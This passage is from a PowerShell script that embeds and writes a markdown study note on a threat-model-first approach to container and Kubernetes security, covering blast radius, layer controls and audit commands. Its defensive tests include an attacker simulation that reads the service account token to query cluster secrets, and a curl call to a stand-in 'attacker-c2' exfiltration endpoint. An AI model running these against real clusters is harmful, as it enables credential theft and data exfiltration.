CIS Benchmark for Docker and Kubernetes provides a scored control
framework. 2023: SLSA framework integrates supply chain security into
the container security model.

---

### 📘 Textbook Definition

**Container security mental model** is a threat-model-first framework
for reasoning about container security: for each layer of the container
stack (build, image, registry, admission, runtime, network, secrets,
host kernel), identify the attack surface, the likely attack vectors,
the blast radius of a successful attack, and the minimum control set
that reduces blast radius to an acceptable level. The mental model
enables consistent, gap-free security design rather than reactive,
checklist-driven security.

---

### ⏱️ Understand It in 30 Seconds

**One line:**
For each container layer, ask: what can an attacker do here, and what
controls limit the damage?

**One analogy:**

> Container security mental model is like a building fire safety plan.
> You do not ask "do we have fire extinguishers?" (checklist). You ask
> "if a fire starts in the kitchen, how far can it spread? Which doors
> contain it? How fast is evacuation? Where are the fire suppression
> systems?" The mental model maps fire paths (attack vectors) and
> containment mechanisms (controls) across the entire building (stack).

**One insight:**
The most valuable output of the container security mental model is the
blast radius assessment: "if this specific container is fully compromised,
what data, systems, and services can the attacker reach?" Reducing blast
radius is more reliable than preventing the initial compromise, because
vulnerabilities in application code are inevitable.

---

### 🔩 First Principles Explanation

**CORE INVARIANTS:**

1. **Compromise is inevitable** - assume any container will eventually
   be compromised via a vulnerability in application code, dependency,
   or configuration. Design to limit blast radius, not just to prevent
   entry.
2. **Each layer has an independent attack surface** - a supply chain
   compromise (malicious base image) is a different attack vector from
   a runtime exploit (CVE in running code). Controls at one layer do
   not protect other layers.
3. **Blast radius is proportional to privilege and reachability** -
   a compromised container with host root, host network, and access to
   all secrets has maximum blast radius. A compromised container with
   no privileges, a restricted network, and no secret access has minimum
   blast radius.
4. **The human is the most attacked layer** - phishing, credential theft,
   and social engineering to gain CI access or registry credentials are
   more common than kernel exploits in practice.

**DERIVED DESIGN:**
Given invariant 1: design the security posture assuming a container
is compromised. Ask "what can the attacker reach?" before asking "how
do we prevent the compromise?". Given invariant 3: minimise privilege
and reachability at every layer to reduce blast radius.

**THE TRADE-OFFS:**
**Gain:** Threat-model-first design produces consistent, gap-free
controls aligned with actual attack vectors.
**Cost:** Threat modelling takes time and requires security knowledge.
Reactive checklists are faster but leave gaps.

**ESSENTIAL vs ACCIDENTAL COMPLEXITY:**
**Essential:** Every layer of the container stack has a distinct attack
surface; each requires independent controls.
**Accidental:** Overlapping controls at the same layer without covering
different attack vectors (e.g., two image scanners but no network policy).

---

### 🧪 Thought Experiment

**SETUP:**
Apply the container security mental model to a payment processing
microservice containerised in Kubernetes.

**LAYER-BY-LAYER THREAT MODEL:**

Build layer: attack vector = malicious dependency in npm (supply chain).
Blast radius = all pods running the compromised image.
Control = Sigstore dependency signing, Renovate for dependency updates.

Image layer: attack vector = base image with critical CVE.
Blast radius = exploitable from inside all running containers.
Control = Trivy scan in CI + continuous registry scan.

Runtime layer: attack vector = RCE in payment processing code.
Blast radius = container's full privilege set.
Control = non-root, dropped capabilities, readOnlyRootFilesystem,
seccomp profile.

Network layer: attack vector = lateral movement to other services.
Blast radius = all services reachable from the payment service network.
Control = NetworkPolicy default-deny, allow only payment-processor to
payment-db and payment-gateway.

Secrets layer: attack vector = steal payment API keys.
Blast radius = fraudulent transactions until keys are rotated.
Control = Vault dynamic secrets with 1-hour TTL, no keys in env vars.

Kernel layer: attack vector = kernel CVE exploitable from container.
Blast radius = host root access = all pods on the node.
Control = seccomp, gVisor RuntimeClass for payment service.

**THE INSIGHT:**
Each layer has a different blast radius. The kernel layer has the
highest (host root = entire node). The secrets layer has high business
impact (fraud). The network layer determines lateral movement scope.
The mental model reveals that the highest-priority control for this
workload is: network isolation (prevent lateral movement) + secrets
security (prevent fraud) + seccomp/gVisor (prevent kernel escape).
Not just "non-root and scan images."

---

### 🧠 Mental Model / Analogy

> Container security is like an onion with concentric defensive rings.
> The outermost ring is supply chain (build-time): compromise here
> affects everything inside. The next ring is the image (registry):
> a vulnerable image affects all its instances. The next ring is admission
> (deployment gate): a misconfigured pod bypasses runtime controls.
> The inner rings are runtime, network, and secrets - each independently
> limits blast radius. The innermost ring is the host kernel: a kernel
> exploit defeats all outer rings.

Element mapping:

- **Outer ring** = supply chain (broadest blast radius)
- **Middle rings** = image, admission, runtime, network, secrets
- **Inner ring** = host kernel (requires final control: gVisor/Kata)
- **Onion depth** = attack complexity required
- **Ring diameter** = blast radius at that layer

Where this analogy breaks down: a real onion's rings are concentric
and uniform; container security layers can be bypassed independently
(a runtime exploit does not require defeating the supply chain layer).

---

### 📶 Gradual Depth - Four Levels

**Level 1 - What it is (anyone can understand):**
Container security mental model is asking "if someone breaks into my
container, how much damage can they do and to what?" - and then adding
controls to limit that damage.

**Level 2 - How to use it (junior developer):**
For any containerised service, work through three questions: (1) What
can an attacker do from inside this container? (List: read secrets,
access network, escape to host, etc.). (2) Which controls limit each
action? (Non-root limits privilege escalation; network policy limits
reachability; secrets management limits credential exposure). (3) Are
there gaps (actions the attacker can take with no limiting control)?

**Level 3 - How it works (mid-level engineer):**
Apply the STRIDE threat model (Spoofing, Tampering, Repudiation,
Information Disclosure, Denial of Service, Elevation of Privilege)
to each container security layer. For each STRIDE threat category,
identify: the specific attack vector at this layer, the blast radius,
the current control, and any gap. The output is a gap analysis that
drives control prioritisation.

**Level 4 - Why it was designed this way (senior/staff):**
Checklist-driven security fails because checklists are reactive (based
on known past attacks) and don't model attacker reasoning. Threat-model-
first security is proactive: it reasons from the attacker's perspective
("what would I want to achieve, and how could I reach it from this
container?") to identify gaps before they are exploited. The container
security mental model is threat modelling applied to the specific attack
surface structure of containerised systems: supply chain, runtime,
network, secrets, and kernel - each with distinct entry points and
blast radii.

**Expert Thinking Cues:**

- "If I were an attacker who had just achieved RCE in this container,
  what are my first three actions? Can any of those be blocked or detected?"
- "What is the blast radius of this container being fully compromised?
  List every system and data store the attacker could reach."
- "Which control in our security posture, if removed, would increase
  blast radius the most? Is that control the highest priority to maintain?"

---

### ⚙️ How It Works (Mechanism)

**CONTAINER SECURITY THREAT MODEL - LAYER MAP:**

```
Layer            Attack Surface         Key Control
-----------      ------------------     ----------------------
Supply Chain     Malicious dependency   Sigstore, SBOM, Renovate
Image            Vulnerable packages    Trivy, continuous scan
Registry         Image tampering        Cosign, RBAC on registry
Admission        Misconfigured pod      Kyverno/OPA Enforce mode
Runtime          RCE via app CVE        non-root, seccomp, caps
Network          Lateral movement       NetworkPolicy default-deny
Secrets          Credential theft       Vault, no env var secrets
Kernel           Container escape       seccomp, AppArmor, gVisor
Host             Node compromise        Node hardening, RBAC
```

**BLAST RADIUS REDUCTION CHECKLIST:**

```
Reduce privilege (limit what attacker can do):
  [ ] runAsNonRoot: true
  [ ] capabilities: drop ALL
  [ ] allowPrivilegeEscalation: false
  [ ] readOnlyRootFilesystem: true
  [ ] seccomp: RuntimeDefault or custom profile

Reduce reachability (limit where attacker can go):
  [ ] NetworkPolicy: default-deny
  [ ] Service account: minimal RBAC
  [ ] No cluster-admin roles for application pods
  [ ] Secrets: minimal scope, short TTL

Reduce detectability window (detect faster):
  [ ] Falco runtime anomaly detection
  [ ] Audit logging for Kubernetes API
  [ ] Image pull logging (detect new image sources)
```

---

### 🔄 The Complete Picture - End-to-End Flow

**NORMAL FLOW (applying the mental model to a new service):**

```
New containerised service design
  |
  v
Define blast radius: what can attacker reach?
  |         ← YOU ARE HERE
  v
Layer-by-layer threat model:
  supply chain / image / admission /
  runtime / network / secrets / kernel
  |
  v
For each layer: identify gaps (attack vectors
with no limiting control)
  |
  v
Prioritise gaps by blast radius impact
  |
  v
Apply minimum control set to close
highest-priority gaps
  |
  v
Document threat model + accepted residual risks
```

**FAILURE PATH:**
Security team runs the mental model but classifies the kernel escape
risk as "low likelihood - accepted." A kernel CVE is disclosed 3 months
later. The risk that was "accepted" becomes an incident. Without the
mental model having documented the accepted residual risk, there is no
clear owner and no mitigation plan ready.

**WHAT CHANGES AT SCALE:**
At scale, individual service threat models are replaced by a service
tier classification: "Tier 1 (external-facing, sensitive data): full
threat model, gVisor, mandatory controls. Tier 2 (internal services):
standard controls. Tier 3 (batch, low-risk): baseline controls." The
mental model defines each tier's control requirements.

---

### 💻 Code Example

```bash
# Threat model validation script:
# Check all pods in namespace for security gaps

#!/bin/bash
NAMESPACE=${1:-default}
echo "=== Container Security Mental Model Audit ==="
echo "Namespace: $NAMESPACE"
echo ""

# Gap 1: Running as root?
echo ">> Pods running as root (gap: privilege):"
kubectl get pods -n $NAMESPACE -o json | jq -r '
  .items[] |
  select(
    (.spec.securityContext.runAsNonRoot != true) or
    (.spec.containers[].securityContext.runAsNonRoot != true)
  ) | .metadata.name'

# Gap 2: No network policy?
echo ">> NetworkPolicy coverage:"
kubectl get networkpolicy -n $NAMESPACE
# If empty: default-allow (gap: lateral movement unrestricted)

# Gap 3: Secrets in env vars?
echo ">> Pods with secrets in env vars (gap: credential exposure):"
kubectl get pods -n $NAMESPACE -o json | jq -r '
  .items[] |
  select(
    .spec.containers[].env[]? |
    .valueFrom.secretKeyRef != null
  ) | .metadata.name'

# Gap 4: No resource limits?
echo ">> Pods without resource limits (gap: DoS):"
kubectl get pods -n $NAMESPACE -o json | jq -r '
  .items[] |
  select(
    .spec.containers[].resources.limits == null
  ) | .metadata.name'
```

```yaml
# Security posture document template
# (threat model output for a service)
# Service: payment-processor
# Last reviewed: 2026-01-15
# Threat model owner: platform-security@company.com

# Layer: Runtime
# Attack vector: RCE via application CVE
# Blast radius (without controls): host root via kernel exploit
# Blast radius (with controls): limited to container process
# Controls applied:
#   - runAsNonRoot: true, runAsUser: 1000
#   - capabilities: drop ALL
#   - seccomp: RuntimeDefault
#   - readOnlyRootFilesystem: true
# Residual risk: unknown future seccomp bypass
# Residual risk owner: platform-security@company.com
# Mitigating factor: gVisor RuntimeClass applied (see kernel layer)
```

**How to test / verify correctness:**

```bash
# Run kubescape to validate against NSA/CISA framework
kubectl apply -f \
  https://github.com/kubescape/kubescape/.../kubescape.yaml
kubescape scan framework nsa -n default

# Run kube-bench for CIS Kubernetes Benchmark
kubectl apply -f https://raw.githubusercontent.com/\
  aquasecurity/kube-bench/main/job.yaml
kubectl logs kube-bench-xxxxx

# Simulate attacker from inside container
# (test blast radius manually)
kubectl exec -it <pod> -- sh -c '
  # Can we reach other services? (network reachability)
  curl http://other-service.other-ns.svc:8080/
  # Can we read kubernetes API? (RBAC exposure)
  curl https://kubernetes.default.svc/api/v1/secrets \
    -H "Authorization: Bearer $(cat /var/run/secrets/\
    kubernetes.io/serviceaccount/token)"
  # Can we write to filesystem? (rootfs writability)
  echo test > /etc/malicious
'
```

---

### ⚖️ Comparison Table

| Layer | Attack Vector | Blast Radius | Key Control | Gap if Missing |
|---|---|---|---|---|
| Supply chain | Malicious dep/base image | All image instances | Cosign, Trivy | Any instance runs attacker code |
| Runtime | RCE via app CVE | Container process | seccomp, non-root | Privilege escalation to host |
| Network | Lateral movement | All reachable services | NetworkPolicy | Entire cluster accessible |
| Secrets | Credential theft | All systems using secret | Vault, no env vars | Long-lived credential exposure |
| Kernel | Container escape | Host + all pods on node | gVisor, seccomp | Node-level compromise |
| Admission | Misconfigured pod | Deployed pod's capabilities | Kyverno Enforce | Bypasses all runtime controls |

---

### ⚠️ Common Misconceptions

| Misconception | Reality |
|---|---|
| "The security team is responsible for container security" | Container security is a shared responsibility: developers own Dockerfile security and application secrets handling; platform teams own admission policies and runtime controls; security teams own threat modelling and compliance. No single team owns all layers. |
| "If we pass the CVE scan, we are secure" | CVE scanning addresses the image layer only. It does not assess runtime configuration, network policies, secrets management, admission control, or kernel-level isolation. Passing a scan is necessary but not sufficient. |
| "Security controls reduce development velocity" | Well-designed controls (admission webhooks, golden path templates, secrets management automation) reduce the security decisions developers must make per-deployment. Correctly implemented, they reduce cognitive load, not increase it. |
| "A zero-trust network replaces container security" | Zero-trust network policies address the network layer (lateral movement). They do not address runtime privilege escalation, supply chain compromise, or kernel exploitation. Network zero-trust is one layer of the mental model, not the entire model. |
| "Once the threat model is done, we are finished" | The threat model is a living document. New vulnerabilities, new attack techniques, new services, and new infrastructure changes all modify the attack surface. Threat models should be reviewed after significant changes and at least annually. |

---

### 🚨 Failure Modes & Diagnosis

**Failure Mode 1: Blast Radius Not Documented**
**Symptom:** A container is compromised. The incident response team
does not know which data stores, services, or secrets the attacker
could have accessed. Forensic investigation takes 3 days instead of
3 hours.
**Root Cause:** No blast radius analysis was conducted for this service.
The incident response team must reverse-engineer the potential access
from the container's network policy, RBAC, and secrets mounts.
**Diagnostic:**

```bash
# Retroactively determine blast radius
# 1. Which services can this pod reach?
kubectl get networkpolicy -n $NS -o yaml | \
  grep -A 20 "podSelector"

# 2. What Kubernetes RBAC does the service account have?
SA=$(kubectl get pod <pod> -o json | \
  jq -r '.spec.serviceAccountName')
kubectl get rolebinding,clusterrolebinding -A -o json | \
  jq --arg SA "$SA" '
  .items[] |
  select(.subjects[]?.name == $SA)'

# 3. What secrets are mounted?
kubectl get pod <pod> -o json | \
  jq '.spec.volumes[] | select(.secret != null)'
```

**Fix:** Document blast radius for all services as part of the threat
model. Store in the service's runbook.
**Prevention:** Make blast radius documentation a pre-deployment
requirement. Include it in the service's architecture decision record.

---

**Failure Mode 2: Security Controls Only in Non-Production**
**Symptom:** Security audit finds that Kyverno policies are enforced
in staging but in audit mode in production ("to avoid disrupting
production").
**Root Cause:** Team deployed controls to staging for testing but did
not graduate to production enforcement due to fear of blocking deployments.
**Diagnostic:**

```bash
# Check enforcement mode per namespace per policy
kubectl get clusterpolicies -o json | jq '
  .items[] | {
    name: .metadata.name,
    action: .spec.validationFailureAction
  }'

# Check if namespaceSelector excludes production
kubectl get clusterpolicies -o yaml | \
  grep -A 5 "namespaceSelector"
```

**Fix:** Graduate all policies to Enforce mode in production. Fix any
violations before graduating. Non-compliant workloads must be fixed,
not excluded from policy scope.
**Prevention:** Security controls must be in Enforce mode in ALL
environments including production. Audit mode is a transition state
only. Track graduation from audit to enforce as a security KPI.

---

**Failure Mode 3: Threat Model Not Reviewed After Architecture Change**
**Symptom:** A new external service dependency is added to a container
(outbound API calls to a third-party payment provider). The network
policy was not updated. The container now has unrestricted egress,
and a compromise enables exfiltration of payment data to any external
endpoint.
**Root Cause:** The threat model and network policies were not reviewed
after the architecture change (new outbound dependency).
**Diagnostic:**

```bash
# Check current egress network policy for the service
kubectl get networkpolicy -n payment -o yaml | \
  grep -A 20 "egress"
# If empty or no egress rules: unrestricted outbound traffic

# Test what external endpoints the pod can reach
kubectl exec -it payment-pod -- \
  curl -m 5 https://attacker-c2.example.com/exfil
# If successful: no egress restriction
```

**Fix:** Update NetworkPolicy to allow egress only to payment-provider.example.com
on port 443. Deny all other egress by default.
**Prevention:** Architecture change review includes: does this change
add or modify network dependencies? If yes, threat model and network
policy review is mandatory.

---

### 🔗 Related Keywords

**Prerequisites (understand these first):**

- [[CTR-021 - Container Security]] - baseline container security concepts
- [[CTR-044 - Container Security Architecture]] - defense-in-depth architecture
- [[CTR-051 - Container Security Research (Rootless, gVisor)]] - advanced isolation

**Builds On This (learn these next):**

- Apply to specific workloads using CTR-044 controls and CTR-052
  trade-off framing

**Alternatives / Comparisons:**

- [[CTR-044 - Container Security Architecture]] - the architectural implementation
- [[CTR-051 - Container Security Research (Rootless, gVisor)]] - kernel isolation layer

---

### 📌 Quick Reference Card

```
┌────────────────────────────────────────────────────┐
│ WHAT IT IS  │ Threat-model-first container security│
│ PROBLEM     │ Reactive checklists leave gaps       │
│ KEY INSIGHT │ Blast radius > prevention            │
│ USE WHEN    │ Designing or auditing container sec  │
│ AVOID WHEN  │ N/A - always apply threat model first│
│ TRADE-OFF   │ Modelling time vs. checklist speed   │
│ ONE-LINER   │ 8 layers, each with blast radius    │
│ NEXT EXPLORE│ CTR-044 Architecture, CTR-051 Adv   │
└────────────────────────────────────────────────────┘
```

**If you remember only 3 things:**

1. Assume compromise is inevitable - design to reduce blast radius,
   not just to prevent entry.
2. Each layer (supply chain, runtime, network, secrets, kernel) has
   an independent attack surface and requires independent controls.
3. Blast radius is proportional to privilege + reachability - reducing
   both is the primary goal of every container security control.

**Interview one-liner:**
"The container security mental model is threat-model-first: for each
layer (supply chain, image, admission, runtime, network, secrets, kernel)
identify attack vectors and blast radius, then apply the minimum control
set that reduces blast radius to an acceptable level - because application
vulnerabilities are inevitable and blast radius management is more
reliable than perfect prevention."

---

### 💎 Transferable Wisdom

**Reusable Engineering Principle:**
In any sufficiently complex system, entry point prevention is insufficient
because: (1) attack surfaces are too large to fully protect, (2) zero-days
exist that bypass current controls, and (3) insider threats bypass perimeter
controls entirely. Blast radius reduction (limit what an attacker can do
after entry) is a more reliable security strategy than entry prevention
alone. Design systems to fail safe: assume the perimeter is breached
and ask "how much damage can the attacker do?"

**Where else this pattern appears:**

- **Zero-trust network architecture:** Assumes any network segment can
  be compromised. Enforces authentication and authorisation at every
  service-to-service call. Blast radius is limited to the compromised
  service's access scope, not the entire network.
- **Least-privilege IAM:** IAM policies grant the minimum permissions
  required. A compromised credential can only access what that credential
  was authorised for. Blast radius is limited by IAM scope.
- **Database encryption at rest:** Assumes the database server can be
  compromised. Encrypts data so that access to the server does not
  automatically grant access to the data. Blast radius is limited to
  the decryption key scope.

---

### 💡 The Surprising Truth

The most common container security incident in practice is not a
sophisticated kernel exploit or a supply chain attack - it is a
developer accidentally committing an API key or database password to
a container image (in a RUN command that was deleted in the final
Dockerfile layer but persists in the image history). Container registries
regularly find thousands of credentials embedded in public images.
The 2023 GitGuardian State of Secrets Sprawl report found over 10
million secrets exposed in public code and container images. The
"attacker" in most cases is not a sophisticated threat actor - it is
an automated scanner looking for exposed credentials. The simplest and
most impactful container security control is secrets scanning in CI,
not runtime threat detection.

---

### 🧠 Think About This Before We Continue

**Q1 (D - Root Cause):** A Kubernetes pod's service account token
(auto-mounted by default in `/var/run/secrets/kubernetes.io/serviceaccount/token`)
is exposed when the pod is compromised. The attacker uses the token
to list all secrets in the cluster via the Kubernetes API. How many
configuration failures led to this blast radius, and what is the
minimum change set that would have contained it?
*Hint:* Consider: (1) auto-mounted service account token (disable
`automountServiceAccountToken: false` if not needed), (2) service
account RBAC (why does this service account have `list secrets` globally?),
(3) network policy (can the compromised pod reach the Kubernetes API at
all?). Three independent control failures - which one has the highest
blast radius impact if fixed?

**Q2 (C - Design Trade-off):** A security team proposes encrypting all
container images at rest in the registry (OCI image encryption). An
architect argues this adds complexity without meaningfully improving
security because the runtime must decrypt the image, which means the
decryption key is present in the environment anyway. Who is correct,
and under what specific threat model does image encryption at rest
provide genuine security value?
*Hint:* Consider: what does "at rest" encryption protect against?
(Physical theft of storage, insider access to the registry's object
store). What does it NOT protect against? (An attacker who can pull
and run containers has the decryption key available). For what
compliance requirements is at-rest encryption mandated regardless of
its operational security value?

**Q3 (B - Scale):** A platform runs 500 containers across 50 services.
The security team has capacity to conduct detailed threat model reviews
for 10 services per quarter. How do you prioritise which services
receive the detailed review, and what lightweight alternative covers
the remaining 40 services per quarter?
*Hint:* Consider risk-tiering criteria: external attack surface (internet-
facing = higher priority), data sensitivity (PII/payment = higher priority),
privilege level (cluster-admin SA = higher priority), and blast radius
(microservice with database access = higher priority). What is the
lightweight alternative for lower-risk services (automated scanning,
self-service threat model template)?
'@

# ── Write files ───────────────────────────────────────────────────────────
$files = @{
    "CTR-051 - Container Security Research (Rootless, gVisor).md" = $ctr051
    "CTR-052 - Container Trade-off Framing.md" = $ctr052
    "CTR-053 - Containerization Necessity Assessment.md" = $ctr053
    "CTR-054 - Container Security Mental Model.md" = $ctr054
}

foreach ($name in $files.Keys) {
    $path = Join-Path $base $name
    [System.IO.File]::WriteAllText(
        $path, $files[$name],
        [System.Text.UTF8Encoding]::new($false))
    $lines = (Get-Content $path -Encoding UTF8).Count
    Write-Host "Written: $name ($lines lines)"
}

foreach ($name in $files.Keys) {
    $path = Join-Path $base $name
    $bytes = [IO.File]::ReadAllBytes($path)
    $bom = "$($bytes[0]),$($bytes[1]),$($bytes[2])"
    Write-Host "BOM check $name : $bom (must NOT be 239,187,191)"
}
